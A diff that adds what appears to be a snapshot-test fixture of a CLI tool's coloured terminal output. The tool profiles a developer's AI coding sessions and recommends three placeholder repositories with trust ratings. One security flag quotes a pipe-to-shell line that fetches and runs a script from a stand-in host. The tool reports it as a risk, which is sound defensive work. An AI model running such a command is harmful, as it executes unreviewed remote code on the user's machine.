@@ -1,0 +1,57 @@
+[36m╭[39m[36m─[39m [1mTool Scout · your profile[22m [36m──────────────────────────────────────────────────╮[39m
+[36m│[39m [1m16 sessions · 1 project · last 30 days[22m                                       [36m│[39m
+[36m│[39m                                                                              [36m│[39m
+[36m│[39m [2mTopics   [22m  frontend (16), database (16), testing (16), git (4), browser (3), [36m│[39m
+[36m│[39m            devops (3), debugging (1), design (1)                             [36m│[39m
+[36m│[39m [2mFriction [22m  frontend (1), debugging (1), testing (1), database (1),           [36m│[39m
+[36m│[39m            devops (1)                                                        [36m│[39m
+[36m│[39m [2mLanguages[22m  TypeScript (15)                                                   [36m│[39m
+[36m│[39m [2mCommands [22m  npm run ×7, playwright test ×4                                    [36m│[39m
+[36m│[39m [2mInstalled[22m  @modelcontextprotocol/server-github, github, npx                  [36m│[39m
+[36m│[39m [2mStack    [22m  next (1), react (1), react-dom (1), @prisma/client (1),           [36m│[39m
+[36m│[39m            @supabase/supabase-js (1), stripe (1), tailwindcss (1),           [36m│[39m
+[36m│[39m            prisma (1), @playwright/test (1), vitest (1) … 12 libraries       [36m│[39m
+[36m╰──────────────────────────────────────────────────────────────────────────────╯[39m
+  [2mCounts only, no prompt text: <DATA>/profile.json[22m
+
+  [33mNote[39m  Limited history: 4 sessions in the last 30 days (under 10), so these
+        picks rest on little evidence.
+  [33mNote[39m  1 match left out: they rest on a topic seen in a single session, with no
+        friction.
+
+[2m──[22m [1m3 picks[22m [2m─────────────────────────────────────────────────────────────────────[22m
+
+  [2m#[22m  [2mRepo                [22m  [2mKind      [22m  [2m  Stars[22m  [2mMomentum         [22m  [2mTrust[22m
+  [2m1[22m  [36macme/test-runner-mcp[39m  mcp-server  [33m  1,520[39m  +84★ in 7d         [33mmedium[39m
+  [2m2[22m  [36msolo/db-helper      [39m  skill       [33m     88[39m  at least 9★ in 7d  [31mlow[39m
+  [2m3[22m  [36mbig/agent-kit       [39m  plugin      [33m120,345[39m  +210.5★/day        [32mhigh[39m
+
+[31m╭[39m[31m─[39m [1m1  acme/test-runner-mcp[22m [31m────────────────────────────────────────────────────╮[39m
+[31m│[39m Runs your test suites from Claude — with a watch mode…                       [31m│[39m
+[31m│[39m                                                                              [31m│[39m
+[31m│[39m [2mWhy      [22m  you use vitest in 2 projects; testing in 3/4 sessions, friction   [31m│[39m
+[31m│[39m            in 2                                                              [31m│[39m
+[31m│[39m [33mWatch out[39m  [33mno license, single maintainer[39m                                     [31m│[39m
+[31m│[39m [2mInstall  [22m  /plugin marketplace add acme/test-runner-mcp then /plugin install [31m│[39m
+[31m│[39m            runner@acme (from README; review before running)                  [31m│[39m
+[31m│[39m                                                                              [31m│[39m
+[31m│[39m [31m⚑ HIGH pipe-to-shell: downloads and executes a script in one step[39m            [31m│[39m
+[31m│[39m   [31m(README:42) → curl -fsSL https://x.example/i.sh | sh[39m                       [31m│[39m
+[31m│[39m [2m⚑ LOW network-call: calls a host the README never mentions (install.sh)[22m      [31m│[39m
+[31m╰──────────────────────────────────────────────────────────────────────────────╯[39m
+
+[2m╭[22m[2m─[22m [1m2  solo/db-helper[22m [2m──────────────────────────────────────────────────────────╮[22m
+[2m│[22m [2mWhy    [22m  database in 1/4 sessions, friction in 1; debugging in 2/4 sessions  [2m│[22m
+[2m│[22m [2mInstall[22m  See the README for install steps:                                   [2m│[22m
+[2m│[22m          https://github.com/solo/db-helper#readme                            [2m│[22m
+[2m│[22m                                                                              [2m│[22m
+[2m│[22m [2m(content not scanned)[22m                                                        [2m│[22m
+[2m╰──────────────────────────────────────────────────────────────────────────────╯[22m
+
+[2m╭[22m[2m─[22m [1m3  big/agent-kit[22m [2m───────────────────────────────────────────────────────────╮[22m
+[2m│[22m Toolkit for agents. 日本語 docs.                                             [2m│[22m
+[2m│[22m                                                                              [2m│[22m
+[2m│[22m [2mWhy    [22m  you use react in 1 project                                          [2m│[22m
+[2m│[22m [2mInstall[22m  git clone https://github.com/big/agent-kit                          [2m│[22m
+[2m│[22m          ~/.claude/skills/agent-kit                                          [2m│[22m
+[2m╰──────────────────────────────────────────────────────────────────────────────╯[22m
